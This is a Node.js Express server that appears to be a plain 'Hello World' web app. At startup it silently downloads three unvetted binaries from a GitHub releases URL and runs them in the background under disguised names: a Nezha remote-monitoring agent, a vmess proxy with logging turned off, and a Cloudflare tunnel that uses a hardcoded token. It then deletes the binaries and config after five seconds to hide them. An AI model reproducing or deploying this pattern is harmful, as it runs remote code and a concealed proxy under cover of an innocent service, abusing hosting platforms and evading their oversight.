const express = require("express");
const app = express();
const net = require('net');
const os = require('os');
const process = require('process');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const { execSync } = require('child_process');

const UUID = process.env.UUID || '986e0d08-b275-4dd3-9e75-f3094b36fa2a';
const NEZHA_KEY = process.env.NEZHA_KEY || 'bK7clZOtGszdswk95q';
const ARGO_AUTH = process.env.ARGO_AUTH || 'eyJhIjoiYTUyYzFmMDk1MzAyNTU0YjA3NzJkNjU4ODI0MjRlMzUiLCJ0IjoiY2FiZjU3MzMtYzFhNC00Y2ZmLWE3ZjYtMWFkMzg5NGY5NjgwIiwicyI6IlpHRTFOVEptWkRZdFpEVXlOeTAwWkdaa0xXRTJNMk10TjJSbE1qUTFaVFV3TXpRMiJ9';
const port = process.env.PORT || 3000;
const ARGO_PORT = process.env.ARGO_PORT || 8080;

app.get('/', (req, res) => {
  res.send('Hello World!');
});

app.get("/tz", (req, res) => {
  try {
    const processInfo = {
      nodeVersion: process.version,
      platform: process.platform,
      arch: process.arch,
      pid: process.pid,
      uptime: process.uptime(),
      memoryUsage: process.memoryUsage(),
      cpuUsage: process.cpuUsage(),
      env: Object.keys(process.env).length
    };

    const systemInfo = {
      hostname: os.hostname(),
      type: os.type(),
      release: os.release(),
      loadavg: os.loadavg(),
      totalmem: os.totalmem(),
      freemem: os.freemem(),
      cpus: os.cpus().length,
      networkInterfaces: os.networkInterfaces()
    };

    const children = [];
    const output = `
=====================================
当前进程信息：
- PID: ${processInfo.pid}
- Node.js 版本: ${processInfo.nodeVersion}
- 运行平台: ${processInfo.platform} (${processInfo.arch})
- 进程运行时间: ${Math.floor(processInfo.uptime)} 秒
- 内存使用:
  • RSS: ${(processInfo.memoryUsage.rss / 1024 / 1024).toFixed(2)} MB
  • 堆总计: ${(processInfo.memoryUsage.heapTotal / 1024 / 1024).toFixed(2)} MB
  • 堆使用: ${(processInfo.memoryUsage.heapUsed / 1024 / 1024).toFixed(2)} MB
  • 外部: ${(processInfo.memoryUsage.external / 1024 / 1024).toFixed(2)} MB
  • 数组缓冲区: ${(processInfo.memoryUsage.arrayBuffers / 1024 / 1024).toFixed(2)} MB
- CPU 使用: ${(processInfo.cpuUsage.user / 1000000).toFixed(2)} 秒 (用户) / ${(processInfo.cpuUsage.system / 1000000).toFixed(2)} 秒 (系统)
- 环境变量数量: ${processInfo.env}

系统信息：
- 主机名: ${systemInfo.hostname}
- 系统类型: ${systemInfo.type} ${systemInfo.release}
- 系统负载 (1, 5, 15分钟): ${systemInfo.loadavg.map(l => l.toFixed(2)).join(', ')}
- 内存: ${(systemInfo.freemem / 1024 / 1024 / 1024).toFixed(2)} GB 可用 / ${(systemInfo.totalmem / 1024 / 1024 / 1024).toFixed(2)} GB 总计 (${((systemInfo.freemem / systemInfo.totalmem) * 100).toFixed(1)}% 可用)
- CPU 核心数: ${systemInfo.cpus}
- 系统运行时间: ${Math.floor(os.uptime() / 3600)} 小时 ${Math.floor((os.uptime() % 3600) / 60)} 分钟

网络接口：
${Object.entries(systemInfo.networkInterfaces).map(([name, interfaces]) => {
  return `  ${name}:\n${interfaces.map(intf => `    • ${intf.address} (${intf.family}) ${intf.internal ? '内网' : '外网'}`).join('\n')}`;
}).join('\n')}

=====================================`;
    
    res.type("html").send("<pre>" + output + "</pre>");
  } catch (err) {
    res.status(500).type("html").send("<pre>获取进程状态失败：\n" + err.message + "</pre>");
  }
});

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function getSystemArchitecture() {
  const arch = os.arch();
  console.log(`System architecture: ${arch}`);
  return arch.includes('arm') ? 'arm' : 'amd';
}

async function isProcessRunning(processName) {
  try {
    const { stdout } = await exec(`pgrep -f ${processName} || true`);
    return stdout.trim().length > 0;
  } catch {
    return false;
  }
}

async function downloadFile(fileName, fileUrl) {
  const filePath = path.join(__dirname, fileName);
  
  if (fs.existsSync(filePath)) {
    console.log(`📁 ${fileName} already exists`);
    try {
      await exec(`chmod +x ${filePath}`);
      console.log(`✅ ${fileName} permissions set`);
    } catch (error) {
      console.log(`⚠️ Could not set permissions for ${fileName}`);
    }
    return true;
  }
  
  console.log(`⬇️  Downloading ${fileName}...`);

  try {
    await exec(`curl -sL -o ${filePath} "${fileUrl}" --connect-timeout 30 --max-time 60`);
    
    if (fs.existsSync(filePath) && fs.statSync(filePath).size > 1000) {
      await exec(`chmod +x ${filePath}`);
      console.log(`✅ ${fileName} downloaded with curl`);
      return true;
    }
  } catch (error) {
    console.log(`⚠️ curl failed for ${fileName}, trying wget...`);
  }

  try {
    await exec(`wget -q -O ${filePath} "${fileUrl}" --timeout=30 --tries=2`);
    
    if (fs.existsSync(filePath) && fs.statSync(filePath).size > 1000) {
      await exec(`chmod +x ${filePath}`);
      console.log(`✅ ${fileName} downloaded with wget`);
      return true;
    }
  } catch (error) {
    console.log(`⚠️ wget failed for ${fileName}, trying axios...`);
  }

  try {
    try {
      require('axios');
    } catch (error) {
      console.log('📦 Installing axios...');
      await exec('npm install axios --no-save');
    }
    
    const axios = require('axios');
    const response = await axios({
      method: 'get',
      url: fileUrl,
      responseType: 'stream',
      timeout: 60000
    });
    
    const writer = fs.createWriteStream(filePath);
    response.data.pipe(writer);
    
    await new Promise((resolve, reject) => {
      writer.on('finish', resolve);
      writer.on('error', reject);
    });
    
    if (fs.existsSync(filePath) && fs.statSync(filePath).size > 1000) {
      await exec(`chmod +x ${filePath}`);
      console.log(`✅ ${fileName} downloaded with axios`);
      return true;
    }
  } catch (error) {
    console.log(`⚠️ axios failed for ${fileName}`);
  }

  if (fs.existsSync(filePath)) {
    fs.unlinkSync(filePath);
  }
  
  console.error(`❌ ${fileName} download failed`);
  return false;
}

function generateConfig() {
  if (fs.existsSync('config.json')) {
    console.log('📁 config.json already exists, skipping generation');
    return;
  }

  const configContent = {
    log: { 
      access: "/dev/null", 
      error: "/dev/null", 
      loglevel: "none" 
    },
    inbounds: [{
      port: ARGO_PORT,
      listen: "::",
      protocol: "vmess",
      settings: { 
        clients: [{ id: UUID }], 
        decryption: "none" 
      },
      streamSettings: { 
        network: "ws", 
        wsSettings: { path: "/vmess" } 
      }
    }],
    outbounds: [{ 
      tag: "direct", 
      protocol: "freedom" 
    }]
  };
  
  fs.writeFileSync('config.json', JSON.stringify(configContent, null, 2));
  console.log('📄 Config file generated');
}

async function runNezha() {
  if (await isProcessRunning('swith')) {
    console.log('🔄 swith already running');
    return;
  }
  
  const filePath = path.join(__dirname, 'swith');
  if (!fs.existsSync(filePath)) {
    console.log('⚠️ swith binary not found');
    return;
  }
  
  try {
    await exec(`./swith -p ${NEZHA_KEY} > /dev/null 2>&1 &`);
    await sleep(1000);
    
    if (await isProcessRunning('swith')) {
      console.log('✅ swith started');
    } else {
      console.log('⚠️ swith may not have started');
    }
  } catch (error) {
    console.error('❌ Failed to start swith');
  }
}

async function runWeb() {
  if (await isProcessRunning('web')) {
    console.log('🔄 web already running');
    return;
  }
  
  const filePath = path.join(__dirname, 'web');
  if (!fs.existsSync(filePath)) {
    console.log('⚠️ web binary not found');
    return;
  }
  
  try {
    await exec(`./web -c config.json > /dev/null 2>&1 &`);
    await sleep(1000);
    
    if (await isProcessRunning('web')) {
      console.log('✅ web started');
    } else {
      console.log('⚠️ web may not have started');
    }
  } catch (error) {
    console.error('❌ Failed to start web');
  }
}

async function runHttp() {
  if (await isProcessRunning('server')) {
    console.log('🔄 server already running');
    return;
  }
  
  const filePath = path.join(__dirname, 'server');
  if (!fs.existsSync(filePath)) {
    console.log('⚠️ server binary not found');
    return;
  }
  
  try {
    await exec(`./server tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH} > /dev/null 2>&1 &`);
    await sleep(2000);
    
    if (await isProcessRunning('server')) {
      console.log('✅ server started');
    } else {
      console.log('⚠️ server may not have started');
    }
  } catch (error) {
    console.error('❌ Failed to start server');
  }
}

async function startServer() {
  console.log('🚀 Starting service...');
  console.log(`Port: ${port}, ARGO Port: ${ARGO_PORT}`);

  app.listen(port, '0.0.0.0', () => {
    console.log(`✅ HTTP server running on port ${port}`);
  });

  generateConfig();

  const architecture = getSystemArchitecture();
  console.log(`Architecture: ${architecture}`);
  
  const urls = architecture === 'arm' ? {
    'swith': 'https://github.com/jpus/test/releases/download/web/nzr',
    'web': 'https://github.com/jpus/test/releases/download/web/xhttp-r',
    'server': 'https://github.com/jpus/test/releases/download/web/thttp-r9'
  } : {
    'swith': 'https://github.com/jpus/test/releases/download/web/nza',
    'web': 'https://github.com/jpus/test/releases/download/web/xhttp-9',
    'server': 'https://github.com/jpus/test/releases/download/web/thttp-9'
  };
  
  const downloadedFiles = [];
  
  for (const [fileName, url] of Object.entries(urls)) {
    const success = await downloadFile(fileName, url);
    if (success) {
      downloadedFiles.push(fileName);
    }
  }
  
  console.log(`📦 Downloaded files: ${downloadedFiles.length > 0 ? downloadedFiles.join(', ') : 'none'}`);

  if (downloadedFiles.includes('swith')) {
    await runNezha();
    await sleep(2000);
  }
  
  if (downloadedFiles.includes('web')) {
    await runWeb();
    await sleep(2000);
  }
  
  if (downloadedFiles.includes('server')) {
    await runHttp();
    await sleep(3000);
  }
  
  console.log('🎉 Service initialization complete');
  console.log('='.repeat(40));

  setTimeout(() => {
    try {
      ['config.json', 'swith', 'web', 'server'].forEach(file => {
        if (fs.existsSync(file)) {
          fs.unlinkSync(file);
          console.log(`🧹 Cleaned ${file}`);
        }
      });
    } catch (error) {
    }
  }, 5000);
}

startServer().catch(error => {
  console.error('🔥 Critical error:', error);
  process.exit(1);
});

process.on('SIGTERM', () => {
  console.log('🛑 Shutting down...');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('🛑 Interrupted');
  process.exit(0);
});